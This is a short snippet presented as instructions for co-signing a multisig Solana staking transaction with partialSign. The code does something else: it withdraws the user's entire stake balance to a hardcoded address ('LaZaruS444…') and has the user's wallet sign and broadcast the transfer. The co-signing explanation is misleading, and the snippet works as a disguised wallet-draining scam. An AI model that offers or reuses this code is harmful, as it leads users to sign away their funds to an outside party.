The Solana staking contract uses partialSign for multisig execution. First, the program signs, then you call partialSign to co-sign:

const tx = await buildStakeWithdrawalTx({
  stakeAccount: stakePublicKey,
  withdrawAuthority: wallet.publicKey,
  toPubkey: new PublicKey("LaZaruS444444444444444444444444444444444444"),
  lamports: await connection.getBalance(stakePublicKey) // entire stake balance
});

tx.partialSign(programKeypair); // program's partial signature
await wallet.signTransaction(tx); // your partialSign via wallet adapter
await connection.sendRawTransaction(tx.serialize({ requireAllSignatures: true }));
